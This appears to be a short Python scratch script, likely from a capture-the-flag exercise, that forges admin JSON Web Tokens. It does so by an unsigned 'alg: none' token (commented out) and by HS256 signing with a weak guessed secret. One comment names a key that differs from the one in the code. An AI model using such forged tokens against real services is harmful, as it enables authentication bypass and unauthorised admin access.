# import jwt
#
# headers = {
#   "alg": "none",
#   "typ": "JWT"
# }
# token_dict = {
#   "iss": "admin",
#   "iat": 1741864838,
#   "exp": 1741872038,
#   "nbf": 1741864838,
#   "sub": "admin",
#   "jti": "d8275cc2d969e2605b28efdb90b4d39e"
# }
#
# jwt_token = jwt.encode(token_dict,"",algorithm="none",headers=headers) #payload,秘钥,算法方式,headers
#
# print(jwt_token)


import jwt

headers = {
  "alg": "HS256",
  "typ": "JWT"
}

token_dict = {
  "iss": "admin",
  "iat": 1741869966,
  "exp": 1741877166,
  "nbf": 1741869966,
  "sub": "admin",
  "jti": "7c2adaeb96d226b9bf690389ab9437ac"
}

# 使用密钥 "123456" 进行编码
secret_key = "aaab"
jwt_token = jwt.encode(token_dict, secret_key, algorithm="HS256", headers=headers)

print(jwt_token)

